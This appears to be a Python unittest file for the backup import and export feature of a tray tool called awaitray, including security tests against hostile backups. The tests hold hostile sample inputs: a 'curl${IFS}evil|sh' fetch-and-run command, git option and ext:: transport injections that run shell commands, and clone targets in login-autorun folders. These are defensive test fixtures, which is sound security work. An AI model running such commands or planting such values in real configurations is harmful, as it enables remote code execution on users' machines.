import json
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from awaitray import backup as backup_mod
from awaitray import config as cfg_mod

_GIT_ENV = {
    **os.environ,
    "GIT_AUTHOR_NAME": "t",
    "GIT_AUTHOR_EMAIL": "t@example.com",
    "GIT_COMMITTER_NAME": "t",
    "GIT_COMMITTER_EMAIL": "t@example.com",
}


def _git(cwd, *args):
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True, env=_GIT_ENV)


class _Machine:
    """A fake computer: its own $HOME and its own ~/.config/awaitray."""

    def __init__(self, root: Path, name: str):
        self.home = root / name
        self.home.mkdir(parents=True)
        self.config_dir = self.home / ".config" / "awaitray"

    def activate(self, case: unittest.TestCase):
        patches = [
            mock.patch.dict(os.environ, {"HOME": str(self.home)}),
            mock.patch.object(cfg_mod, "CONFIG_DIR", self.config_dir),
            mock.patch.object(cfg_mod, "CONFIG_PATH", self.config_dir / "config.json"),
            mock.patch.object(cfg_mod, "LEGACY_CONFIG_DIR", self.home / ".config" / "devtray"),
            mock.patch.object(cfg_mod, "last_load_warning", None),
        ]
        for p in patches:
            p.start()
            case.addCleanup(p.stop)

    def write_config(self, raw: dict):
        self.config_dir.mkdir(parents=True, exist_ok=True)
        (self.config_dir / "config.json").write_text(json.dumps(raw))

    def read_config(self) -> dict:
        return json.loads((self.config_dir / "config.json").read_text())


class _Case(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = Path(tmp.name)


class PathTests(_Case):
    def test_collapse_and_expand_home(self):
        m = _Machine(self.root, "a")
        m.activate(self)
        home = str(m.home)
        self.assertEqual(backup_mod.collapse_home(f"{home}/code/x"), "~/code/x")
        self.assertEqual(backup_mod.collapse_home(home), "~")
        self.assertEqual(backup_mod.collapse_home("/opt/x"), "/opt/x")
        self.assertEqual(backup_mod.collapse_home(f"{home}x/y"), f"{home}x/y")  # not a prefix match
        self.assertEqual(backup_mod.expand_home("~/code/x"), f"{home}/code/x")

    def test_config_load_accepts_tilde_but_saves_absolute(self):
        m = _Machine(self.root, "a")
        m.activate(self)
        m.write_config(
            {
                "repos": [{"path": "~/code/web", "excluded": ["~/code/web/tmp"]}],
                "clone_root": "~/code",
            }
        )
        cfg = cfg_mod.load()
        self.assertEqual(cfg.repos[0].path, f"{m.home}/code/web")
        self.assertEqual(cfg.repos[0].excluded, [f"{m.home}/code/web/tmp"])
        self.assertEqual(cfg.clone_root, f"{m.home}/code")
        cfg_mod.save(cfg)
        self.assertEqual(
            m.read_config()["repos"][0]["path"], f"{m.home}/code/web"
        )  # old versions can read it


@unittest.skipUnless(shutil.which("git"), "git required")
class ExportImportAcrossMachinesTests(_Case):
    def _make_repo(self, path: Path, origin: str):
        path.mkdir(parents=True)
        _git(path, "init", "-q")
        _git(path, "remote", "add", "origin", origin)

    def test_round_trip_to_a_machine_with_another_home(self):
        a = _Machine(self.root, "alice-linux")
        a.activate(self)
        origin = "https://github.com/acme/web.git"
        self._make_repo(a.home / "code" / "web", origin)
        a.write_config(
            {
                "hosts": [{"hostname": "github.com", "future_host_field": 1}],
                "repos": [{"path": str(a.home / "code" / "web"), "future_repo_field": True}],
                "clone_root": str(a.home / "code"),
                "future_top_level": "keep me",
            }
        )
        dest = self.root / "backup.json"
        backup_mod.export_backup(dest)

        payload = json.loads(dest.read_text())
        self.assertEqual(payload["format"], "awaitray-backup")
        self.assertEqual(payload["config"]["repos"][0]["path"], "~/code/web")
        self.assertEqual(payload["repo_remotes"], {"~/code/web": origin})
        self.assertNotIn(str(a.home), dest.read_text())  # no machine-specific home left

        b = _Machine(self.root, "alice-mac")
        b.activate(self)
        bk = backup_mod.read_backup(dest)
        plan = backup_mod.plan_import(bk, check_hosts=lambda h: False)
        self.assertEqual(plan.hosts, [("github.com", False)])
        self.assertEqual(
            [(r.path, r.exists) for r in plan.repos], [(str(b.home / "code" / "web"), False)]
        )
        self.assertEqual(plan.missing_clones, [(str(b.home / "code" / "web"), origin)])

        cloned = []
        backup_mod.apply_import(
            bk, plan, clone_missing=True, clone=lambda u, p: cloned.append((u, p)) or True
        )
        self.assertEqual(cloned, [(origin, str(b.home / "code" / "web"))])
        imported = b.read_config()
        self.assertEqual(imported["repos"][0]["path"], str(b.home / "code" / "web"))
        self.assertEqual(imported["clone_root"], str(b.home / "code"))
        self.assertTrue(imported["repos"][0]["future_repo_field"])
        self.assertEqual(imported["future_top_level"], "keep me")
        cfg = cfg_mod.load()
        self.assertEqual(cfg.repos[0].path, str(b.home / "code" / "web"))


class ImportFormatsTests(_Case):
    def setUp(self):
        super().setUp()
        self.m = _Machine(self.root, "m")
        self.m.activate(self)

    def _file(self, obj) -> Path:
        p = self.root / "in.json"
        p.write_text(obj if isinstance(obj, str) else json.dumps(obj))
        return p

    def test_bare_config_json_from_any_version_is_accepted(self):
        bk = backup_mod.read_backup(
            self._file({"hosts": [{"hostname": "ghe.corp"}], "paused": False})
        )
        self.assertIsNone(bk.format_version)
        self.assertEqual(bk.config["hosts"][0]["hostname"], "ghe.corp")

    def test_newer_format_imports_with_a_warning(self):
        bk = backup_mod.read_backup(
            self._file(
                {
                    "format": "awaitray-backup",
                    "format_version": 99,
                    "config": {"hosts": []},
                }
            )
        )
        self.assertTrue(any("newer" in w for w in bk.warnings))

    def test_garbage_is_rejected(self):
        for bad in (
            "{ nope",
            "[1]",
            json.dumps({"hello": "world"}),
            json.dumps({"format": "awaitray-backup", "config": "x"}),
        ):
            with self.assertRaises(backup_mod.BackupError):
                backup_mod.read_backup(self._file(bad))

    def test_import_snapshots_current_settings_first(self):
        self.m.write_config({"hosts": [{"hostname": "old.corp"}]})
        bk = backup_mod.read_backup(self._file({"hosts": [{"hostname": "new.corp"}]}))
        plan = backup_mod.plan_import(bk, check_hosts=lambda h: True)
        backup_mod.apply_import(bk, plan)
        self.assertEqual(self.m.read_config()["hosts"][0]["hostname"], "new.corp")
        snaps = backup_mod.list_snapshots()
        self.assertTrue(any("pre-import" in s.name for s in snaps))
        pre = next(s for s in snaps if "pre-import" in s.name)
        self.assertEqual(json.loads(pre.read_text())["hosts"][0]["hostname"], "old.corp")

    def test_missing_sound_files_are_reset(self):
        bk = backup_mod.read_backup(
            self._file(
                {
                    "hosts": [],
                    "tray_icon": {
                        "buckets": [{"up_to": 1, "emoji": "x", "sound": "/nowhere/ping.wav"}]
                    },
                }
            )
        )
        plan = backup_mod.plan_import(bk, check_hosts=lambda h: True)
        self.assertEqual(plan.missing_sounds, ["/nowhere/ping.wav"])
        backup_mod.apply_import(bk, plan)
        self.assertEqual(self.m.read_config()["tray_icon"]["buckets"][0]["sound"], "")

    def test_missing_editor_is_reported(self):
        bk = backup_mod.read_backup(
            self._file(
                {
                    "hosts": [],
                    "editor": {"enabled": True, "command": "no-such-editor-xyz --wait"},
                }
            )
        )
        plan = backup_mod.plan_import(bk, check_hosts=lambda h: True)
        self.assertEqual(plan.editor_command, "no-such-editor-xyz --wait")


class SnapshotTests(_Case):
    def setUp(self):
        super().setUp()
        self.m = _Machine(self.root, "m")
        self.m.activate(self)

    def test_daily_snapshot_is_taken_once_per_day(self):
        cfg = cfg_mod.load()  # creates the file
        cfg_mod.save(cfg)  # first save of the day → snapshot
        cfg_mod.save(cfg)
        daily = [s for s in backup_mod.list_snapshots() if s.name.endswith("-daily.json")]
        self.assertEqual(len(daily), 1)

    def test_upgrading_from_devtray_is_backed_up(self):
        # update.sh snapshots before the app has ever run under the new name.
        cfg_mod.LEGACY_CONFIG_DIR.mkdir(parents=True)
        (cfg_mod.LEGACY_CONFIG_DIR / "config.json").write_text('{"hosts": [{"hostname": "old"}]}')
        path = backup_mod.snapshot("pre-update")
        self.assertIsNotNone(path)
        self.assertIn('"old"', path.read_text())

    def test_rotation_keeps_the_newest(self):
        cfg_mod.save(cfg_mod.load())
        folder = backup_mod.backups_dir()
        for i in range(15):
            (folder / f"config-20200101-0000{i:02d}-old.json").write_text("{}")
        backup_mod.snapshot("manual")
        snaps = backup_mod.list_snapshots()
        self.assertEqual(len(snaps), backup_mod.SNAPSHOT_KEEP)
        self.assertTrue(any("manual" in s.name for s in snaps))

    def test_external_change_is_kept_before_overwrite(self):
        cfg = cfg_mod.load()
        cfg_mod.save(cfg)
        # Another process (an import, a hand edit) rewrites the file…
        self.m.write_config({"hosts": [{"hostname": "imported.corp"}]})
        os.utime(cfg_mod.CONFIG_PATH, ns=(1, 1))  # make the mtime change unambiguous
        cfg_mod.save(cfg)  # …and this instance saves its stale copy
        kept = [s for s in backup_mod.list_snapshots() if "before-overwrite" in s.name]
        self.assertEqual(len(kept), 1)
        self.assertIn("imported.corp", kept[0].read_text())


class HostileBackupTests(_Case):
    """A backup comes from another machine, maybe someone else's: nothing in
    it may run code here (security audit)."""

    SAFE = ("https://github.com/a/b.git", "ssh://git@ghe.corp:22/a/b", "git@github.com:a/b.git")
    HOSTILE = (
        "--config=core.sshCommand=touch PWNED;false",
        "-uhack",
        "ext::sh -c touch% PWNED",
        "fd::17",
        "file:///etc",
        "/srv/repos/b.git",
        "https://x/a b",
    )

    def setUp(self):
        super().setUp()
        self.m = _Machine(self.root, "m")
        self.m.activate(self)
        self.code = str(self.m.home / "code" / "b")

    def test_only_network_remotes_into_absolute_paths(self):
        for url in self.SAFE:
            self.assertIsNone(backup_mod.clone_problem(url, self.code), url)
        for url in self.HOSTILE:
            self.assertIsNotNone(backup_mod.clone_problem(url, self.code), url)
        for path in ("--template=/tmp/x", "relative/b", ""):
            self.assertIsNotNone(backup_mod.clone_problem(self.SAFE[0], path), path)

    def test_never_into_a_folder_that_runs_code_at_login(self):
        """~/.bashrc.d, ~/.config/systemd/user, ~/Library/LaunchAgents… or
        anywhere outside home: a clone there would run at the next login."""
        home = self.m.home
        (home / "link").symlink_to(home / ".config", target_is_directory=True)
        for path in (
            home / ".bashrc.d",
            home / ".config" / "systemd" / "user",
            home / "code" / ".git" / "hooks",
            home / "Library" / "LaunchAgents",
            home / "link" / "fish",  # a symlink into a hidden folder
            home / "code" / ".." / ".local",
            self.root / "elsewhere",
            home,
        ):
            self.assertIsNotNone(backup_mod.clone_problem(self.SAFE[0], str(path)), path)

    def test_the_plan_only_lists_clones_that_will_run(self):
        bk = backup_mod.Backup(
            config={"hosts": []},
            repo_remotes={"~/.bashrc.d": self.SAFE[0], "~/code/b": self.SAFE[0]},
        )
        plan = backup_mod.plan_import(bk, check_hosts=lambda h: True)
        self.assertEqual(plan.missing_clones, [(self.code, self.SAFE[0])])
        self.assertTrue(any(".bashrc.d" in w for w in plan.warnings))

    def test_the_plan_names_hosts_that_wont_load(self):
        bk = backup_mod.Backup(
            config={"hosts": [{"hostname": "github.com"}, {"hostname": "--web"}]}
        )
        plan = backup_mod.plan_import(bk, check_hosts=lambda h: True)
        self.assertEqual(plan.hosts, [("github.com", True)])
        self.assertIn("won't add '--web': not a hostname", plan.warnings)

    def test_git_is_never_run_for_a_hostile_entry(self):
        with mock.patch.object(backup_mod.subprocess, "run") as run:
            for url in self.HOSTILE:
                self.assertFalse(backup_mod._git_clone(url, self.code))
            self.assertFalse(backup_mod._git_clone(self.SAFE[0], str(self.m.home / ".bashrc.d")))
        run.assert_not_called()

    def test_clone_ends_options_and_refuses_command_transports(self):
        done = mock.Mock(returncode=0, stderr="")
        with mock.patch.object(backup_mod.subprocess, "run", return_value=done) as run:
            self.assertTrue(backup_mod._git_clone(self.SAFE[0], self.code))
        cmd = run.call_args.args[0]
        self.assertEqual(cmd[-3:], ["--", self.SAFE[0], self.code])
        self.assertIn("protocol.ext.allow=never", cmd)


class BackupCommandsTests(_Case):
    """Commands in a backup (editor, browsers) run when you click: they're
    shown in the plan and only imported when asked for."""

    EVIL = "sh -c curl${IFS}evil|sh"

    def setUp(self):
        super().setUp()
        self.m = _Machine(self.root, "m")
        self.m.activate(self)
        self.m.write_config(
            {
                "hosts": [{"hostname": "github.com", "browser": "firefox"}],
                "editor": {"enabled": True, "command": "code"},
                "browser": {"command": ""},
            }
        )
        self.bk = backup_mod.Backup(
            config={
                "hosts": [
                    {"hostname": "github.com", "browser": self.EVIL},
                    {"hostname": "github.com", "user": "x", "browser": self.EVIL},
                ],
                "editor": {"enabled": True, "command": self.EVIL},
                "browser": {"command": self.EVIL},
            }
        )

    def _plan(self):
        return backup_mod.plan_import(self.bk, check_hosts=lambda h: True)

    def test_the_plan_shows_every_command_that_would_run(self):
        plan = self._plan()
        self.assertEqual(
            sorted(where for where, _ in plan.new_commands),
            ["browser", "browser for github.com", "browser for x@github.com", "editor"],
        )
        shown = "\n".join(plan.summary_lines())
        self.assertEqual(shown.count(self.EVIL), 4)

    def test_not_imported_unless_asked(self):
        backup_mod.apply_import(self.bk, self._plan())
        cfg = self.m.read_config()
        self.assertEqual(cfg["editor"]["command"], "code")  # this machine's
        self.assertEqual(cfg["browser"]["command"], "")
        self.assertEqual([h["browser"] for h in cfg["hosts"]], ["firefox", ""])
        self.assertNotIn(self.EVIL, json.dumps(cfg))

    def test_imported_when_asked(self):
        backup_mod.apply_import(self.bk, self._plan(), keep_commands=True)
        self.assertEqual(self.m.read_config()["editor"]["command"], self.EVIL)

    def test_same_commands_as_here_need_no_question(self):
        same = backup_mod.Backup(config=self.m.read_config())
        self.assertEqual(backup_mod.plan_import(same, check_hosts=lambda h: True).new_commands, [])


class CredentialTests(_Case):
    """A remote URL may carry a token; backups and logs never do."""

    def test_secrets_are_stripped_users_kept_where_harmless(self):
        cases = {
            "https://x-access-token:ghp_secret@github.com/o/r.git": "https://github.com/o/r.git",
            "https://ghp_secret@github.com/o/r": "https://github.com/o/r",
            "http://u:p@ghe.corp:8080/o/r": "http://ghe.corp:8080/o/r",
            "ssh://git:secret@ghe.corp:22/o/r": "ssh://git@ghe.corp:22/o/r",
            "ssh://git@ghe.corp/o/r": "ssh://git@ghe.corp/o/r",
            "git@github.com:o/r.git": "git@github.com:o/r.git",
            "https://github.com/o/r": "https://github.com/o/r",
        }
        for url, expected in cases.items():
            self.assertEqual(backup_mod.strip_credentials(url), expected, url)

    def test_an_exported_backup_holds_no_token_and_only_you_can_read_it(self):
        m = _Machine(self.root, "m")
        m.activate(self)
        repo = m.home / "code" / "r"
        repo.mkdir(parents=True)
        _git(repo, "init", "-q")
        _git(repo, "remote", "add", "origin", "https://x:ghp_secret@github.com/o/r.git")
        m.write_config({"hosts": [], "repos": [{"path": str(repo)}]})
        dest = backup_mod.export_backup(self.root / "out.json")
        self.assertNotIn("ghp_secret", dest.read_text())
        self.assertIn("https://github.com/o/r.git", dest.read_text())
        self.assertEqual(dest.stat().st_mode & 0o777, 0o600)
        snap = backup_mod.snapshot("test")
        self.assertEqual(snap.stat().st_mode & 0o777, 0o600)

    def test_a_failed_clone_logs_no_token(self):
        m = _Machine(self.root, "m")
        m.activate(self)
        url = "https://x:ghp_secret@github.com/o/r.git"
        failed = mock.Mock(returncode=128, stderr="fatal: nope")
        with (
            mock.patch.object(backup_mod.subprocess, "run", return_value=failed),
            mock.patch.object(backup_mod.log_mod, "warn") as warn,
        ):
            backup_mod._git_clone(url, str(m.home / "code" / "r"))
        self.assertNotIn("ghp_secret", warn.call_args.args[0])


if __name__ == "__main__":
    unittest.main()
